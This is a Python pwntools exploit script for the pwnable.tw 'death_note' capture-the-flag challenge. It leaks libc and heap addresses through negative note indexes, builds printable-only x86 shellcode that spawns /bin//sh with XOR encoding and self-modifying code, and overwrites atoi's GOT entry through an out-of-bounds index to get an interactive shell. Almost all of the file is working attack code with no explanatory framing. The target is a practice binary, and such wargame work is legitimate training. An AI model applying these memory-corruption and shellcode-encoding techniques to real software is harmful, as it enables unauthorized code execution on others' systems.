from pwn import *
import pdb
import re


def add_note(idx, name):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Index :', str(idx))
    p.sendlineafter('Name :', name)


def show_note(idx):
    p.sendlineafter('Your choice :', '2')
    p.sendlineafter('Index :', str(idx))


def del_note(idx):
    p.sendlineafter('Your choice :', '3')
    p.sendlineafter('Index :', str(idx))


def _exit():
    p.sendlineafter('Your choice :', '4')


def leak_libc():
    show_note(-7)
    res = p.recvuntil('Name : ', timeout=3)
    cont = p.recvline()
    addr = u32(cont[4:8])

    stdout_addr = addr - 71
    print('stdout_addr: {:#x}'.format(stdout_addr))

    return stdout_addr


def leak_heap():
    add_note(0, 'a' * 0x50)
    show_note(-484)
    res = p.recvuntil('Name : ', timeout=3)
    cont = p.recvline()
    addr = u32(cont[:4])
    heap_base = addr - 0x8

    print('heap_base: {:#x}'.format(heap_base))

    return heap_base


def send_code(idx, chunk, delim='\x00'):
    count = chunk.count(delim)
    new_chunk = chunk.replace(delim, '\x2f')
    add_note(idx, new_chunk)
    pdb.set_trace()
    del_note(idx)

    print('count: {}'.format(count))

    for i in range(count):
        pos = chunk.rindex(delim)
        chunk = chunk[:pos]
        new_chunk = new_chunk[:pos] + '\x00'
        print('idx: {}, chunk: {}'.format(i, new_chunk))
        add_note(idx, new_chunk)
        # if i != count - 1:
        del_note(idx)


def is_valid(cont):
    for c in cont:
        n = ord(c)
        if n <= 31 or n >= 127:
            return False

    return True


def bypass(cont):
    res = ''
    pad = ''

    if isinstance(cont, int):
        _cont = p32(cont)
    elif isinstance(cont, str):
        _cont = cont
    else:
        return 0, 0

    print(_cont.encode('hex'))

    for c in _cont:
        n = ord(c)
        for i in range(32, 127):
            _n = n ^ i
            if _n > 31 and _n < 127:
                res += chr(_n)
                pad += chr(i)
                break

    if len(res) < 4 or len(pad) < 4:
        return 0, 0
    else:
        return u32(res), u32(pad)


# p = remote('chall.pwnable.tw',10201)

count = 20
context.log_level = 'info'
target_offset = 0x1b3760
stdout_offset = 0x1b3d60

atoi_got = 0x804A034
note_addr = 0x804A060

if __name__ == '__main__':
    while True:
        # p = process('/home/len/pwnable/death_note')
        p = remote('chall.pwnable.tw',10201)
        stdout_addr = leak_libc()
        libc_base = stdout_addr - stdout_offset
        print('libc_base: {:#x}'.format(libc_base))

        heap_base = leak_heap()

        del_note(0)

        target = libc_base + target_offset
        print('target: {:#x}'.format(target))
        # fake_chunk = '\x00'*4 + '\x79\x00\x00\x00' + 'a'*0x20
        # send_chunk(0, fake_chunk)

        # pdb.set_trace()

        # add_note(1, 'b'* 0x50)
        # del_note(-484)

        shellcode = '''
        push 0x20202020
        pop eax
        xor eax, 0x20202020
        push eax
        push eax
        pop ecx
        pop edx
        push eax
        push   0x68732f2f
        push   0x6e69622f
        push esp
        pop ebx
    
        '''

        libc_base = 0x8413000

        # print(asm(shellcode).encode('hex'))

        int80 = 0x80cd
        int80_1 = 0x202f7f33
        int80_2 = 0x20300000
        int80_1_res, int80_1_pad = bypass(int80_1)
        print('int80_1: {:#x}, int80_1_res: {:#x}, int80_1_pad: {:#x}'.format(
            int80_1, int80_1_res, int80_1_pad))
        # mov esi, int80_1
        shellcode += '''
        push %#x
        pop eax
        xor eax, %#x
        push eax
        pop esi
        ''' % (int80_1_res, int80_1_pad)

        target = heap_base + 8 + 65
        print('heap_base: {:#x},target: {:#x}'.format(heap_base, target))

        target_res, target_pad = bypass(target)

        print('target: {:#x}, target_res: {:#x}, target_pad: {:#x}'.format(
            target, target_res, target_pad))
        # mov eax, target
        # sub [eax], esi
        shellcode += '''
        push %#x
        pop eax
        xor eax, %#x
        sub [eax], esi
        ''' % (target_res, target_pad)

        shellcode += '''
        push %#x
        pop eax
        xor eax, %#x
        ''' % bypass(0xb)

        payload = asm(shellcode)
        print(payload.encode('hex'))
        if not is_valid(payload):
            p.close()
            continue
        else:
            print(len(payload))

            payload += p32(int80_2)
            pdb.set_trace()
            print(payload.encode('hex'))
            send_code(2, payload)

            pdb.set_trace()
            add_note((atoi_got - note_addr) / 4, payload)

            pdb.set_trace()

            p.interactive()
            break